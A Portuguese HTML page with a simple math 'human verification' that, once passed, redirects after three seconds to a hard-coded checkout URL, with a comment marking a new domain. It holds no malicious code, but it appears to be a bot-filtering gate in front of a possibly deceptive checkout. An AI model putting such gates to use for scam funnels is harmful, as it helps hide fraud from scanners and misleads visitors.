<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verificação</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #fff;
    color: #080808;
}

.overlay {
    position: fixed;
    inset: 0;
    background: #898a8e;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10;
}

.card {
    width: 420px;
    min-height: 290px;
    background: #fff;
    border-radius: 16px;
    padding: 36px 32px;
    box-shadow: 0 20px 45px rgba(0,0,0,.28);
    animation: entrada .25s ease;
}

@keyframes entrada {
    from {
        opacity: 0;
        transform: translateY(8px) scale(.98);
    }
    to {
        opacity: 1;
        transform: translateY(0) scale(1);
    }
}

.icon-area {
    display: flex;
    justify-content: center;
    margin-bottom: 22px;
}

.icon {
    width: 52px;
    height: 52px;
    border-radius: 50%;
    background: #ffe8ed;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #ff2d55;
}

.icon svg {
    width: 25px;
    height: 25px;
}

h2 {
    font-size: 20px;
    font-weight: 700;
    margin-bottom: 10px;
}

.description {
    font-size: 14px;
    color: #666;
    line-height: 24px;
    margin-bottom: 23px;
}

.buttons {
    display: flex;
    gap: 12px;
}

button {
    height: 44px;
    border-radius: 9px;
    font-size: 14px;
    cursor: pointer;
    flex: 1;
    transition: .15s;
    font-weight: 500;
}

.primary {
    border: none;
    background: #ef2048;
    color: white;
    font-weight: 700;
}

.primary:hover {
    background: #db193e;
}

.primary:active {
    transform: scale(.98);
}

.secondary {
    border: 1px solid #ddd;
    background: #f5f5f5;
    color: #666;
}

.secondary:hover {
    background: #ededed;
}

.question {
    width: 100%;
    background: #ddfafa;
    padding: 15px;
    border-radius: 8px;
    text-align: center;
    font-size: 17px;
    font-weight: bold;
    margin: 8px 0 19px;
}

label {
    display: block;
    font-size: 12px;
    font-weight: 600;
    color: #666;
    letter-spacing: .6px;
    margin-bottom: 6px;
}

input {
    width: 100%;
    height: 46px;
    border-radius: 9px;
    border: 1px solid #ff2d55;
    outline: none;
    padding: 0 13px;
    font-size: 16px;
    margin-bottom: 18px;
    background: #fafafa;
    box-shadow: 0 0 0 2px rgba(255,45,85,.15);
}

input:focus {
    border-color: #ff2d55;
    box-shadow: 0 0 0 3px rgba(255,45,85,.12);
}

input::placeholder {
    color: #777;
}

.erro {
    display: none;
    color: #e11d48;
    font-size: 12px;
    margin-top: -10px;
    margin-bottom: 13px;
}

/* TELA DE CONFIRMAÇÃO */

.confirmacao {
    position: fixed;
    inset: 0;
    background: #fff;
    display: none;
    align-items: center;
    justify-content: center;
    text-align: center;
    z-index: 30;
}

.confirm-content {
    transform: translateY(-20px);
}

.check {
    width: 72px;
    height: 72px;
    border-radius: 50%;
    background: #ffe8ed;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 28px;
    color: #ff2d55;
}

.check svg {
    width: 32px;
    height: 32px;
}

.confirmacao h1 {
    font-size: 25px;
    margin-bottom: 13px;
}

.confirmacao p {
    color: #665c5c;
    font-size: 14px;
    line-height: 25px;
}

.loading {
    display: flex;
    justify-content: center;
    gap: 9px;
    margin-top: 30px;
}

.loading span {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: #ff8098;
    animation: pulse 1.2s infinite;
}

.loading span:nth-child(2) {
    animation-delay: .2s;
}

.loading span:nth-child(3) {
    animation-delay: .4s;
}

@keyframes pulse {
    0%, 100% {
        opacity: .35;
        transform: scale(.85);
    }

    50% {
        opacity: 1;
        transform: scale(1.15);
    }
}

@media(max-width: 500px) {
    .card {
        width: calc(100% - 35px);
        padding: 32px 25px;
    }

    .buttons {
        gap: 8px;
    }

    .confirmacao h1 {
        font-size: 22px;
    }
}
</style>
</head>

<body>

<!-- TELA 1 -->

<div class="overlay" id="welcome">

    <div class="card">

        <div class="icon-area">
            <div class="icon">

                <svg
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round">

                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    <path d="m9 12 2 2 4-4"/>

                </svg>

            </div>
        </div>

        <h2>Bem-vindo</h2>

        <p class="description">
            Vamos fazer uma verificação rápida para liberar
            o acesso à sua consulta.
        </p>

        <div class="buttons">

            <button
                class="primary"
                onclick="iniciar()">

                Iniciar acesso

            </button>

            <button
                class="secondary"
                onclick="cancelar()">

                Cancelar

            </button>

        </div>

    </div>

</div>


<!-- TELA 2 -->

<div
    class="overlay"
    id="captcha"
    style="display:none;">

    <div class="card">

        <div class="icon-area">

            <div class="icon">

                <svg
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round">

                    <circle cx="12" cy="7" r="4"/>
                    <path d="M5.5 21a6.5 6.5 0 0 1 13 0z"/>

                </svg>

            </div>

        </div>

        <h2>Prova humana</h2>

        <div
            class="question"
            id="pergunta">

            Quanto é 3 + 1?

        </div>

        <label>
            DIGITE SUA RESPOSTA
        </label>

        <input
            type="number"
            id="resposta"
            placeholder="Sua resposta..."
            autocomplete="off"
        >

        <div
            class="erro"
            id="erro">

            Resposta incorreta. Tente novamente.

        </div>

        <div class="buttons">

            <button
                class="primary"
                onclick="verificar()">

                Prosseguir

            </button>

            <button
                class="secondary"
                onclick="voltar()">

                Voltar

            </button>

        </div>

    </div>

</div>


<!-- TELA 3 -->

<div
    class="confirmacao"
    id="confirmacao">

    <div class="confirm-content">

        <div class="check">

            <svg
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round">

                <polyline points="20 6 9 17 4 12"></polyline>

            </svg>

        </div>

        <h1>
            Confirmação de segurança
        </h1>

        <p>
            Confirmamos que você não é um robô.
            <br>
            Aguarde enquanto realizamos o direcionamento
            <br>
            seguro para o atendimento.
        </p>

        <div class="loading">
            <span></span>
            <span></span>
            <span></span>
        </div>

    </div>

</div>


<script>

/* NOVO DOMÍNIO */

const URL_DESTINO =
    "https://novaricheckout.vercel.app/";

/* 3 segundos */

const TEMPO_REDIRECIONAMENTO = 3000;

let respostaCorreta = 0;


/* CRIA CONTA ALEATÓRIA */

function gerarConta() {

    let numero1 =
        Math.floor(Math.random() * 10) + 1;

    let numero2 =
        Math.floor(Math.random() * 10) + 1;

    const operador =
        Math.random() < 0.5 ? "+" : "-";


    /* NÃO DEIXA RESULTADO NEGATIVO */

    if (
        operador === "-" &&
        numero2 > numero1
    ) {

        const temp = numero1;

        numero1 = numero2;
        numero2 = temp;
    }


    if (operador === "+") {

        respostaCorreta =
            numero1 + numero2;

    } else {

        respostaCorreta =
            numero1 - numero2;
    }


    document
        .getElementById("pergunta")
        .textContent =
        `Quanto é ${numero1} ${operador} ${numero2}?`;
}


/* INICIAR */

function iniciar() {

    gerarConta();

    document
        .getElementById("welcome")
        .style.display = "none";

    document
        .getElementById("captcha")
        .style.display = "flex";


    setTimeout(() => {

        document
            .getElementById("resposta")
            .focus();

    }, 100);
}


/* VOLTAR */

function voltar() {

    document
        .getElementById("captcha")
        .style.display = "none";

    document
        .getElementById("welcome")
        .style.display = "flex";

    document
        .getElementById("resposta")
        .value = "";

    document
        .getElementById("erro")
        .style.display = "none";
}


/* CANCELAR */

function cancelar() {

    document
        .getElementById("welcome")
        .style.display = "none";
}


/* VERIFICAR */

function verificar() {

    const input =
        document.getElementById("resposta");

    const erro =
        document.getElementById("erro");


    if (input.value === "") {

        erro.textContent =
            "Digite sua resposta.";

        erro.style.display =
            "block";

        input.focus();

        return;
    }


    const respostaUsuario =
        Number(input.value);


    /* ACERTOU */

    if (
        respostaUsuario ===
        respostaCorreta
    ) {

        erro.style.display =
            "none";

        document
            .getElementById("captcha")
            .style.display =
            "none";

        document
            .getElementById("confirmacao")
            .style.display =
            "flex";


        /* REDIRECIONA APÓS 3 SEGUNDOS */

        setTimeout(() => {

            window.location.href =
                URL_DESTINO;

        }, TEMPO_REDIRECIONAMENTO);

    }

    /* ERROU */

    else {

        erro.textContent =
            "Resposta incorreta. Tente novamente.";

        erro.style.display =
            "block";

        input.value = "";

        input.focus();

        gerarConta();
    }
}


/* ENTER TAMBÉM CONFIRMA */

document
    .getElementById("resposta")
    .addEventListener(
        "keydown",
        function(event) {

            if (event.key === "Enter") {
                verificar();
            }

        }
    );

</script>

</body>
</html>
